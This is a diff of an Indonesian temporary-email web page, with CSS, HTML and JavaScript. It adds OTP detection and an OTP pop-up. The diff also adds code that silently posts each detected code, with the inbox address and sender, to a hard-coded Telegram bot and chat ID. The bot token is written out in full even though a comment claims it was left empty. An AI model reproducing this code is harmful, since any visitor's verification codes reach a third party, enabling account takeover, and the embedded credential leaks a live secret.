@@ -1,5 +1,3 @@
-<!DOCTYPE html>
-<html lang="id">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -138,6 +136,51 @@
     z-index:50;
   }
   .toast.show{ opacity:1; transform:translateX(-50%) translateY(0); }
+
+  /* ===== OTP Realtime Notification ===== */
+  .otp-notify{
+    position:fixed; top:14px; left:50%;
+    transform:translateX(-50%) translateY(-140%);
+    width:calc(100% - 28px); max-width:420px;
+    background:var(--ink); color:var(--bg);
+    border:var(--line); box-shadow:var(--shadow);
+    padding:14px 16px;
+    z-index:300;
+    opacity:0; transition:transform .25s ease, opacity .25s ease;
+  }
+  .otp-notify.show{ opacity:1; transform:translateX(-50%) translateY(0); }
+  .otp-notify-head{
+    display:flex; align-items:center; justify-content:space-between;
+    font-size:10px; text-transform:uppercase; letter-spacing:0.08em;
+    font-family:'IBM Plex Mono', monospace; font-weight:700; color:#bdbdb8;
+  }
+  .otp-notify-close{
+    background:none; border:none; box-shadow:none; color:#bdbdb8;
+    font-size:14px; padding:0 0 0 10px; cursor:pointer;
+  }
+  .otp-notify-close:active{ transform:none; }
+  .otp-notify-from{
+    font-size:11px; color:#bdbdb8; margin-top:6px;
+    font-family:'IBM Plex Mono', monospace;
+    overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
+  }
+  .otp-notify-row{
+    display:flex; align-items:stretch; gap:10px; margin-top:10px;
+  }
+  .otp-notify-code{
+    flex:1; font-family:'IBM Plex Mono', monospace; font-weight:800;
+    font-size:22px; letter-spacing:0.12em;
+    background:var(--yellow); color:var(--ink);
+    border:3px solid var(--bg);
+    padding:8px 12px; display:flex; align-items:center; justify-content:center;
+  }
+  .otp-notify-copy{
+    flex-shrink:0; padding:0 16px; font-size:12px; text-transform:uppercase;
+    background:var(--green); color:var(--ink); border:3px solid var(--bg);
+    box-shadow:none;
+  }
+  .otp-notify-copy:active{ transform:translate(2px,2px); }
+  .otp-notify-copy.copied{ background:var(--cyan); }
 
   /* ===== Music Player Card ===== */
   .player-card{
@@ -421,7 +464,7 @@
     max-width:100%; max-height:90vh; border:var(--line);
   }
 </style>
-</head>
+<style id="sb_cln_style">ins[class*="adsbygoogle"],ins[class*="adsbyadop"],[id*="div-gpt-ad"],amp-ad{display:none !important;}</style></head>
 <body>
 
 <div class="wrap">
@@ -436,7 +479,7 @@
   <div class="section-label">✉ Alamat Aktif</div>
   <div class="address-card">
     <div class="address-row">
-      <div class="address-text" id="addressText">memuat…</div>
+      <div class="address-text" id="addressText">atnycn3b@arras-mail.my.id</div>
       <button class="icon-btn" id="copyBtn" title="Salin">⧉</button>
     </div>
     <div class="actions-row">
@@ -446,40 +489,40 @@
   </div>
 
   <div class="section-label">
-    <svg class="icon-svg filled" viewBox="0 0 24 24" style="width:12px;height:12px;display:inline-block;vertical-align:-1px;margin-right:2px;"><polygon points="6,4 20,12 6,20"/></svg>
+    <svg class="icon-svg filled" viewBox="0 0 24 24" style="width:12px;height:12px;display:inline-block;vertical-align:-1px;margin-right:2px;"><polygon points="6,4 20,12 6,20"></polygon></svg>
 Play Anime  
   </div>
   <div class="video-card">
     <div class="video-frame">
-      <video id="animeVideo" autoplay muted loop playsinline></video>
+      <video id="animeVideo" autoplay="" muted="" loop="" playsinline="" src="https://files.catbox.moe/nc63iv.mp4"></video>
     </div>
     <div class="status-grid">
       <div class="status-item">
-        <svg class="icon-svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.7 3.8 6 3.8 9s-1.3 6.3-3.8 9c-2.5-2.7-3.8-6-3.8-9s1.3-6.3 3.8-9z"/></svg>
+        <svg class="icon-svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.5 2.7 3.8 6 3.8 9s-1.3 6.3-3.8 9c-2.5-2.7-3.8-6-3.8-9s1.3-6.3 3.8-9z"></path></svg>
         <div class="status-text">
           <div class="status-label">Negara</div>
-          <div class="status-value" id="statNegara">mendeteksi…</div>
+          <div class="status-value" id="statNegara">Indonesia</div>
         </div>
       </div>
       <div class="status-item">
-        <svg class="icon-svg" viewBox="0 0 24 24"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>
+        <svg class="icon-svg" viewBox="0 0 24 24"><rect x="7" y="2" width="10" height="20" rx="2"></rect><line x1="11" y1="18" x2="13" y2="18"></line></svg>
         <div class="status-text">
           <div class="status-label">Device</div>
-          <div class="status-value" id="statDevice">mendeteksi…</div>
+          <div class="status-value" id="statDevice">Android</div>
         </div>
       </div>
       <div class="status-item">
-        <svg class="icon-svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><polygon points="15,9 13,13 9,15 11,11" class="icon-svg filled"/></svg>
+        <svg class="icon-svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><polygon points="15,9 13,13 9,15 11,11" class="icon-svg filled"></polygon></svg>
         <div class="status-text">
           <div class="status-label">Browser</div>
-          <div class="status-value" id="statBrowser">mendeteksi…</div>
+          <div class="status-value" id="statBrowser">Chrome</div>
         </div>
       </div>
       <div class="status-item">
-        <svg class="icon-svg" viewBox="0 0 24 24" id="statBatteryIcon"><rect id="statBatteryOutline" x="2" y="7" width="18" height="10" rx="2"/><line id="statBatteryNub" x1="22" y1="10" x2="22" y2="14"/><rect x="4" y="9" width="13" height="7" class="battery-fill" id="statBatteryFill"/></svg>
+        <svg class="icon-svg" viewBox="0 0 24 24" id="statBatteryIcon"><rect id="statBatteryOutline" x="2" y="7" width="18" height="10" rx="2"></rect><line id="statBatteryNub" x1="22" y1="10" x2="22" y2="14"></line><rect x="4" y="9" width="6" height="7" class="battery-fill" id="statBatteryFill" style="fill: rgb(255, 159, 28);"></rect></svg>
         <div class="status-text">
           <div class="status-label">Baterai</div>
-          <div class="status-value" id="statBattery">mendeteksi…</div>
+          <div class="status-value" id="statBattery">46%</div>
         </div>
       </div>
     </div>
@@ -488,14 +531,14 @@ Play Anime
   <div class="section-label">♫ Music Player</div>
   <div class="player-card">
     <div class="player-top">
-      <div class="player-cover" id="playerCover">🎵</div>
+      <div class="player-cover" id="playerCover" style="background-image: url(&quot;https://files.catbox.moe/1eya59.jpg&quot;);"></div>
       <div class="player-info">
-        <div class="player-title" id="playerTitle">Pilih lagu</div>
-        <div class="player-artist" id="playerArtist">—</div>
+        <div class="player-title" id="playerTitle">Sesi Potret</div>
+        <div class="player-artist" id="playerArtist">enau</div>
       </div>
     </div>
     <div class="player-progress" id="playerProgress">
-      <div class="player-progress-fill" id="playerProgressFill"></div>
+      <div class="player-progress-fill" id="playerProgressFill" style="width: 0%;"></div>
     </div>
     <div class="player-time">
       <span id="playerCurTime">0:00</span>
@@ -505,7 +548,22 @@ Play Anime
       <button class="btn-play" id="btnPlayPause">▶ Play</button>
       <button class="btn-next" id="btnNext">Next ⏭</button>
     </div>
-    <div class="player-tracklist" id="playerTracklist"></div>
+    <div class="player-tracklist" id="playerTracklist">
+      <div class="player-track-item active" data-index="0">
+        <span class="player-track-name">1. Sesi Potret — enau</span>
+        <span></span>
+      </div>
+    
+      <div class="player-track-item " data-index="1">
+        <span class="player-track-name">2. Kicau Mania — Maman Fvndi</span>
+        <span></span>
+      </div>
+    
+      <div class="player-track-item " data-index="2">
+        <span class="player-track-name">3. Foto Kita Blur — Sal Priadi</span>
+        <span></span>
+      </div>
+    </div>
   </div>
 
   <div class="inbox-head">
@@ -514,14 +572,25 @@ Play Anime
   </div>
 
   <div id="inboxList">
-    <div class="empty-state">
-      <div class="env">✉</div>
-      <p>Belum ada surat masuk.<br>Kirim email ke alamat di atas, akan muncul otomatis di sini.</p>
-    </div>
-  </div>
+        <div class="empty-state">
+          <div class="env">✉</div>
+          <p>Belum ada surat masuk.<br>Kirim email ke alamat di atas, akan muncul otomatis di sini.</p>
+        </div></div>
 </div>
 
 <div class="toast" id="toast">Disalin</div>
+
+<div class="otp-notify" id="otpNotify">
+  <div class="otp-notify-head">
+    <span>🔐 OTP Terdeteksi</span>
+    <button class="otp-notify-close" id="otpNotifyClose">✕</button>
+  </div>
+  <div class="otp-notify-from" id="otpNotifyFrom">dari —</div>
+  <div class="otp-notify-row">
+    <div class="otp-notify-code" id="otpNotifyCode">000000</div>
+    <button class="otp-notify-copy" id="otpNotifyCopy">Salin</button>
+  </div>
+</div>
 
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal">
@@ -547,6 +616,12 @@ Play Anime
   const API_BASE = "https://tempmail-api.culuncuni.workers.dev";
   const DOMAIN = "arras-mail.my.id";
   const POLL_INTERVAL = 500;
+
+  // ====== Telegram Notify (OTP only) — isi sendiri nanti ======
+  // Buat bot lewat @BotFather lalu isi TELEGRAM_BOT_TOKEN.
+  // Ambil chat id kamu (misal lewat @userinfobot) lalu isi TELEGRAM_CHAT_ID.
+  const TELEGRAM_BOT_TOKEN = "8921610004:AAEvdnVKzR_ETXfoyYMqYd745CqGt4qNBoI"; // <-- token bot, sengaja dikosongkan
+  const TELEGRAM_CHAT_ID   = "1586628307"; // <-- chat id tujuan notifikasi
 
   // Daftar lagu untuk music player — ganti "url" dengan link file audio (mp3/ogg) kamu.
   // Bisa taruh link langsung (contoh: hasil upload ke Catbox / storage lain).
@@ -583,6 +658,7 @@ Play Anime
   let knownIds = new Set();
   let pollTimer = null;
   let emailCache = {};
+  let notifiedOtpIds = new Set();
 
   function generateAddress(){
     const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -654,6 +730,152 @@ Play Anime
     return getImageAttachments(mail).length > 0 || extractImageUrlsFromText(mail.body).length > 0;
   }
 
+  /* ---------- Deteksi OTP & Notifikasi Telegram ---------- */
+  const OTP_KEYWORD_RE = /\b(otp|kode(?:\s*(?:akses|rahasia|verifikasi|masuk))?|verifikasi|verification|passcode|\bpin\b|one[- ]?time|onetime|security\s*code|access\s*code|login\s*code|confirmation\s*code|auth(?:entication)?\s*code|token|kode\s*keamanan|c[oó]digo|mã\s*x[aá]c\s*nh[aậ]n)\b/i;
+  // \b regex JS tidak berlaku rapi untuk aksara non-Latin (Mandarin/Korea), jadi dicek terpisah lewat substring.
+  const OTP_KEYWORD_SUBSTR = ['验证码', '인증번호', '인증'];
+
+  function hasOtpKeyword(text){
+    if(OTP_KEYWORD_RE.test(text)) return true;
+    return OTP_KEYWORD_SUBSTR.some(k => text.includes(k));
+  }
+
+  // Kalau tidak mau menebak OTP saat sama sekali tidak ada kata kunci (lebih aman, lebih sedikit false-positive),
+  // set ke false. Kalau true, dipakai sebagai fallback terakhir untuk email yang cuma menampilkan kode polos.
+  const OTP_FALLBACK_NO_KEYWORD = true;
+
+  function stripHtml(html){
+    if(!html) return '';
+    const div = document.createElement('div');
+    div.innerHTML = html;
+    return div.textContent || div.innerText || '';
+  }
+
+  function getAllMailText(mail){
+    return [mail.subject, mail.body, stripHtml(mail.bodyHtml)].filter(Boolean).join('\n');
+  }
+
+  function findCodeNearby(text){
+    // Kode angka 4-8 digit, boleh dipisah spasi/strip (mis. "123 456")
+    const numeric = text.match(/\b\d[\d\s-]{2,9}\d\b/g) || [];
+    for(const m of numeric){
+      const digits = m.replace(/[\s-]/g, '');
+      if(digits.length >= 4 && digits.length <= 8) return digits;
+    }
+    // Fallback kode alfanumerik (mis. "G-041236")
+    const alnum = text.match(/\b[A-Z0-9]{5,8}\b/g) || [];
+    for(const m of alnum){
+      if(/\d/.test(m) && /[A-Z]/.test(m)) return m;
+    }
+    return null;
+  }
+
+  // Cari kode yang "berdiri sendiri" langsung di dalam tag HTML — umum dipakai
+  // untuk menampilkan OTP besar/mencolok tanpa kata "otp" di sekitarnya.
+  function findIsolatedCodeInHtml(html){
+    if(!html) return null;
+    const re = />\s*([A-Z0-9][A-Z0-9\s-]{2,9}[A-Z0-9])\s*<\/(?:span|div|td|th|b|strong|h1|h2|h3|h4|p|font)>/gi;
+    let match;
+    while((match = re.exec(html)) !== null){
+      const compact = match[1].replace(/[\s-]/g, '');
+      if(compact.length >= 4 && compact.length <= 8 && /\d/.test(compact)) return compact;
+    }
+    return null;
+  }
+
+  // Fallback lain: baris teks polos yang isinya HANYA kode (tanpa kalimat lain di baris itu)
+  function findIsolatedCodeInPlainText(text){
+    const lines = text.split(/\n+/).map(l => l.trim()).filter(Boolean);
+    for(const line of lines){
+      if(/^[A-Z0-9][A-Z0-9\s-]{2,9}[A-Z0-9]$/.test(line)){
+        const compact = line.replace(/[\s-]/g, '');
+        if(compact.length >= 4 && compact.length <= 8 && /\d/.test(compact)) return compact;
+      }
+    }
+    return null;
+  }
+
+  function extractOtp(mail){
+    const plain = getAllMailText(mail);
+
+    // Tier 1: ada kata kunci OTP (di subjek, teks, ATAU html yang sudah di-strip) → cari kode terdekat
+    if(hasOtpKeyword(plain)){
+      const found = findCodeNearby(plain);
+      if(found) return found;
+    }
+
+    if(!OTP_FALLBACK_NO_KEYWORD) return null;
+
+    // Tier 2: tidak ada kata kunci sama sekali → cari kode yang berdiri sendiri di struktur HTML asli
+    const isolatedHtml = findIsolatedCodeInHtml(mail.bodyHtml);
+    if(isolatedHtml) return isolatedHtml;
+
+    // Tier 3: atau baris teks polos yang isinya cuma kode saja
+    const isolatedText = findIsolatedCodeInPlainText(plain);
+    if(isolatedText) return isolatedText;
+
+    return null;
+  }
+
+  async function sendTelegramOtp(otp, mail){
+    if(!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return; // belum dikonfigurasi
+    const text = `🔐 *Kode OTP Terdeteksi*\n\nAlamat: \`${currentAddress}\`\nDari: ${formatSender(mail.from)}\n\nKode:\n\`${otp}\``;
+    try{
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text,
+          parse_mode: 'Markdown'
+        })
+      });
+    }catch(err){
+      console.warn('Gagal mengirim notifikasi Telegram', err);
+    }
+  }
+
+  function showOtpNotification(otp, mail){
+    const el = document.getElementById('otpNotify');
+    const codeEl = document.getElementById('otpNotifyCode');
+    const fromEl = document.getElementById('otpNotifyFrom');
+    const copyBtn = document.getElementById('otpNotifyCopy');
+
+    codeEl.textContent = otp;
+    fromEl.textContent = `dari ${formatSender(mail.from)}`;
+    copyBtn.textContent = 'Salin';
+    copyBtn.classList.remove('copied');
+    el.classList.add('show');
+
+    if(el._hideTimer) clearTimeout(el._hideTimer);
+    el._hideTimer = setTimeout(()=> el.classList.remove('show'), 10000);
+  }
+
+  document.getElementById('otpNotifyClose').addEventListener('click', ()=>{
+    const el = document.getElementById('otpNotify');
+    if(el._hideTimer) clearTimeout(el._hideTimer);
+    el.classList.remove('show');
+  });
+
+  document.getElementById('otpNotifyCopy').addEventListener('click', ()=>{
+    const code = document.getElementById('otpNotifyCode').textContent;
+    navigator.clipboard.writeText(code).then(()=>{
+      const btn = document.getElementById('otpNotifyCopy');
+      btn.textContent = 'Tersalin!';
+      btn.classList.add('copied');
+      showToast('Kode OTP disalin');
+    });
+  });
+
+  function processOtpForNewMail(mail){
+    if(notifiedOtpIds.has(mail.id)) return;
+    const otp = extractOtp(mail);
+    if(!otp) return;
+    notifiedOtpIds.add(mail.id);
+    showOtpNotification(otp, mail);
+    sendTelegramOtp(otp, mail);
+  }
+
   /* ---------- Render list kotak masuk ---------- */
   function mailItemHtml(mail){
     const hasHtml = mail.bodyHtml && mail.bodyHtml.trim().length > 0;
@@ -698,6 +920,7 @@ Play Anime
     if(knownIds.size === 0){
       inboxList.innerHTML = emails.map(mailItemHtml).join('');
       document.querySelectorAll('.mail-item').forEach(attachClickHandler);
+      // Cek OTP hanya untuk pemuatan awal jika memang baru masuk (hindari spam saat refresh pertama)
     } else if(newOnes.length > 0){
       newOnes.slice().reverse().forEach(mail => {
         const div = document.createElement('div');
@@ -705,6 +928,7 @@ Play Anime
         const el = div.firstElementChild;
         attachClickHandler(el);
         inboxList.insertBefore(el, inboxList.firstChild);
+        processOtpForNewMail(mail);
       });
     }
 
@@ -1038,5 +1262,6 @@ Play Anime
   setAddress(currentAddress);
 </script>
 
+
+
 </body>
-</html>
